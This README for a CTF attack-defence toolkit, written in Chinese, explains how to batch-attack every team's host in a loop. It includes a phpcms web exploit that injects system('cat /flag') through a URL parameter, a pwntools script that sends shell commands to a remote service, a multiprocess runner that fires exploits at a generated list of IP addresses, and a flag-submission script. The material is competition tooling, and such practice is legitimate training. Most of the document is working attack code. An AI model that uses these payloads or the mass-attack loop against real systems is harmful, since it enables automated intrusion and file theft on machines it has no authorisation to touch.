# awd_script



AWD批量攻击脚本(Web/Pwn通用)，通过bash编写，远程信息采用参数传入exp，通过多进程方式实现同时攻打，阻塞超时自动结束进程。

各位师傅，下面批量脚本已运用在多次线下awd比赛中，其中web/pwn都运用过，各位web|| pwn师傅给个星是对我最大的支持，谢谢！



文件目录

```
.
├── attack.sh : 批量攻击脚本
├── hosts : 攻击靶机远程信息，ip:port
├── init_hosts.sh : 初始化队伍ip和端口，将信息储存在hosts文件
├── pwn_exp.py : awd pwn exp脚本例子
├── pwn_upload.py : 文件上传脚本 [PWN使用]
├── submit_flag.py  : 批量提交flag脚本
└── web_exp.py : awd web exp脚本例子
```



## 批量如何使用？

### 初始化hosts文件

先初始化hosts文件，采用init_hosts.sh脚本进行初始化。

```sh
#!/bin/bash

ip_start=101
ip_end=180
ip=10.1.
port=8080

rm hosts 2> /dev/null
for((i=$ip_start; i < $ip_end; i++));
do
    echo $ip$i".2":$port >> hosts
done
```

需要自行更改ip生成规则，生成完毕后，会得到hosts文件，查看下ip和端口是否正常。

hosts文件格式是 ip:port

```
10.1.101.2:8080
10.1.102.2:8080
10.1.103.2:8080
10.1.104.2:8080
10.1.105.2:8080
10.1.106.2:8080
10.1.107.2:8080
10.1.108.2:8080
10.1.109.2:8080
```



### 适配exp

在自己的exp中远程信息采用命令参数进行传入

```python
from sys import *

server_ip = sys.argv[1].split(':')[0]
server_port = int(sys.argv[1].split(':')[1])
```



且在exp中加入write_to_flags函数

```python
def write_to_flags(d):
    fd = open('./flags', 'ab')
    fd.write(d + b'\n')
    fd.close()
```

打到的flag将flag进行传入到write_to_flags()函数中。

pwn exp例子:

```python
#!/usr/bin/env python3
# A script for awd exp

from pwn import *
import os
import sys

def write_to_flags(d):
    fd = open('./flags', 'ab')
    fd.write(d + b'\n')
    fd.close()

ip = server_ip = sys.argv[1].split(':')[0]
port = int(sys.argv[1].split(':')[1])
io = remote(ip, port)

io.sendline('cat flag')
io.recvuntil('{')
flag = 'flag{' + io.recvuntil('}')
write_to_flags(flag)


io.interactive()
```

web exp例子:

```python
#! /usr/bin/python3
import os
import sys
import requests

def write_to_flags(d):
	fd = open('./flags', 'ab')
	fd.write(d + b'\n')
	fd.close()

server_ip = sys.argv[1].split(':')[0]
server_port = sys.argv[1].split(':')[1]
url = 'http://'
url += server_ip + ':' + server_port + '/phpcms/modules/sms/sms.php?a=system(%27cat%20/flag%27);'
res = requests.get(url,timeout=2)
data = res.text
flag = ('flag{' + data.split('{')[1]).split('}')[0] + '}'

#data = data.split('}')[0] + '}\n'
print(flag)
write_to_flags(flag.encode())
```



### 编写批量提交脚本

批量条脚本如下框架，自行根据比赛平台抓包修改http头部信息以及请求数据。

```python
#!/usr/bin/env python3
# A script for awd loop submit flag

import os
import json
import requests
li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')

url = 'https://172.20.1.1/'
flag_file = './flags'
header = {
    'Cookie': 'none'
}

def submit():
        with open(flag_file) as flag_txt:
                flags = flag_txt.readlines()
                for flag in flags:
                        flag = flag.strip()
                        d = ''
                        d += flag
                        print(d)
                        try:
                                res = requests.post(url,data=d,headers=header,timeout=2)
                                li(res.text)
                        except:
                                li('connect fail!')
                                continue
submit()
```



Example:

```python
#!/usr/bin/env python3
# Author: i0gan
# A script for awd loop submit flag

import os
import json
import requests
li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')

url = 'http://1.12.220.15/commit/flag'
flag_file = './flags'
header = {
    "Host": "1.12.220.15",
"Proxy-Connection": "keep-alive",
"Accept": "application/json, text/javascript, */*; q=0.01",
"X-Requested-With": "XMLHttpRequest",
"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
"Content-Type": "application/json; charset=UTF-8",
"Origin": "http://1.12.220.15",
"Referer": "http://1.12.220.15/admin",
"Accept-Encoding": "gzip, deflate",
"Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
}

def submit():
    with open(flag_file) as flag_txt:
        flags = flag_txt.readlines()
        for flag in flags:
            flag = flag.strip()
            d = '{"flag":"' 
            d += flag
            d += '","token":"KKKKKKKKKK"}'
            print(d)
            try:
                res = requests.post(url,data=d,headers=header,timeout=2)
                li(res.text)
            except:
                li('connect fail!')
                continue
submit()

```



### 调整自己运行exp方式

attack.sh脚本就是批量攻击脚本，攻击脚本如下。

```sh
#! /bin/sh
# A script for awd loop attack

attack_times=10000 # 总共攻击循环次数，设置大一点，就不用管了
round_wait_time=540 # 下一轮次的等待时间，也就是flag的刷新间隔时间
wait_submit_time=20 # 在实现一次循环攻击后，等待多久调用自动批量提交flag脚本，根据自身exp多久拿到flag来调整，web一般短一点，而pwn的话可能要长一点。
log_file="logs" # 输出的日志文件
run_time=3m # 运行exp多久后自动杀掉，有时候会出现阻塞现象，导致卡死，采用超时杀掉进程即可。
next_attack_time=0.2 # 一个循环中，下一个攻击的时间，0.2s基本可以了，若自己电脑性能一点的话，可以设置小一点。

log() {
    t=`date "+%H:%M:%S"`
    m="[$t]$m"
    info="\033[43;37m $m ]\033[0m"
    echo -e "$info"
    echo -e "\n$m" >> $log_file
}

attack() {
    rm flags
    for line in `cat hosts`;do
        timeout --foreground $run_time  python ./web_exp.py $line & # 调用exp，传入远程信息。
        sleep $next_attack_time # 两次攻击之间的间隔时间，不要设置为0,不然会出现莫名奇妙的错误
    done
    echo -e "\x1b[47;30m Waitting $wait_submit_time s to submit flag\x1b[0m"
    sleep $wait_submit_time # 等待提交
    echo -e "\x1b[47;30m Submiting flag\x1b[0m"
    python3 ./submit_flag # 打完一次批量后，自动提交flag，若批量提交flag脚本还没实现，可以注释掉
}

for((i=1; i <= $attack_times; i++)); # 循环攻打
do
    m="-------- round $i --------"
    log $m
    attack
    echo -e "\x1b[47;30m Waitting next round\x1b[0m"
    sleep $round_wait_time # 等待下一轮次
done
```



每次攻击循环，会依次遍历hosts文件中的远程信息，采用多进程方式进行攻打。

单个攻击命令执行如下

```bash
timeout --foreground $run_time python ./web_exp.py $line &
```

而$line是从hosts文件取出来的单行信息，用于给exp传入远程host信息。



### 开始自动化攻击以及提交

运行

```
bash attack.sh
```

